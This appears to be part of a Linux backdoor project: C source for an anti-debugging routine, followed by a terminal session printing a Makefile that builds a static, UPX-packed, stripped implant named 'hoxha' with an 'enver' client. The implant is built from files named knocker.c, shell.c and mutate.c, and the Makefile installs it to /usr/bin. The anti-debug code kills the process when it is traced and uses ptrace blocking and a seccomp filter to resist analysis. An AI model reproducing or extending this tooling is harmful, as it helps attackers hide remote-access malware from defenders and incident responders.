#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/prctl.h>
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <sys/syscall.h>
#include <stddef.h>

// Kill immediately
static void die(const char *msg) {
    fprintf(stderr, "[anti_debug] %s\n", msg);
    kill(getpid(), SIGKILL);
}

// Step 1: Check if already being traced
static void check_tracer_pid(void) {
    FILE *f = fopen("/proc/self/status", "r");
    if (!f) return;

    char line[256];
    while (fgets(line, sizeof(line), f)) {
        if (strncmp(line, "TracerPid:", 10) == 0) {
            int tracer_pid = atoi(line + 10);
            fclose(f);
            if (tracer_pid != 0) {
                die("Tracer detected (TracerPid)");
            }
            return;
        }
    }
    fclose(f);
}

// Step 2: Prevent future ptrace attaches
static void block_ptrace_attaches(void) {
    prctl(PR_SET_DUMPABLE, 0);
    prctl(PR_SET_PTRACER, -1);
}

// Step 3: Install a Seccomp BPF filter to kill on ptrace syscall
static void install_seccomp_ptrace_kill(void) {
    struct sock_filter filter[] = {
        // Load syscall number
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS,
                 offsetof(struct seccomp_data, nr)),
        // If syscall == ptrace → kill
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_ptrace, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),
        // Else → allow
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
    };

    struct sock_fprog prog = {
        .len = sizeof(filter) / sizeof(filter[0]),
        .filter = filter,
    };

    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) != 0)
        perror("prctl(NO_NEW_PRIVS)");
    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog) != 0)
        perror("prctl(SECCOMP)");
}

// 🔒 Call this once early in your program
void anti_debug(void) {
#ifdef __linux__
    check_tracer_pid();
    block_ptrace_attaches();
    install_seccomp_ptrace_kill();
#endif
}
root@teamsloth:/home/ph33r/hoxha# cat Makefile 
CC        := cc
OUT       := hoxha
CLIENT    := enver
UPX	:= ./upx
SSTRIP    := ./sstrip
SRC       := knocker.c shell.c mutate.c anti_debug.c
BINDIR    := /usr/bin
CHMOD     := chmod +x

CFLAGS    := -static -s -pipe -march=native -O2 -std=gnu17 -Wall -Wextra -pedantic \
             -fno-stack-protector -fno-asynchronous-unwind-tables -fno-ident \
             -ffunction-sections -fdata-sections -falign-functions=1 \
             -falign-loops=1 --no-data-sections -falign-jumps=1 \
             -falign-labels=1 -flto -fipa-icf -z execstack

LDFLAGS   := -Wl,-z,norelro -Wl,-O1 -Wl,--build-id=none -Wl,-z,separate-code
LIBS      := -lsctp -lpthread

CLIENT_CFLAGS := -s -pipe -march=native -O2 -std=gnu17 -Wall -Wextra -pedantic \
                 -fno-stack-protector -fno-asynchronous-unwind-tables -fno-ident \
                 -ffunction-sections -fdata-sections -falign-functions=1 \
                 -falign-loops=1 --no-data-sections -falign-jumps=1 \
                 -falign-labels=1 -flto -fipa-icf -z execstack

CLIENT_LDFLAGS := -Wl,-z,norelro -Wl,-O1 -Wl,--build-id=none -Wl,-z,separate-code
CLIENT_LIBS    := -lsctp

.PHONY: all clean install

all: $(OUT) $(CLIENT)

$(OUT): $(SRC)
	$(CC) $(SRC) -o $@ $(CFLAGS) $(LDFLAGS) $(LIBS)
	$(CHMOD) $(UPX)
	$(CHMOD) $(SSTRIP)
	$(UPX) --best --brute $(OUT)
	$(SSTRIP) -z $(OUT)

$(CLIENT): enver.c
	$(CC) enver.c -o $@ $(CLIENT_CFLAGS) $(CLIENT_LDFLAGS) $(CLIENT_LIBS)

install: all
	install -Dm755 $(OUT) $(BINDIR)/$(OUT)

clean:
	rm -f $(OUT) $(CLIENT)
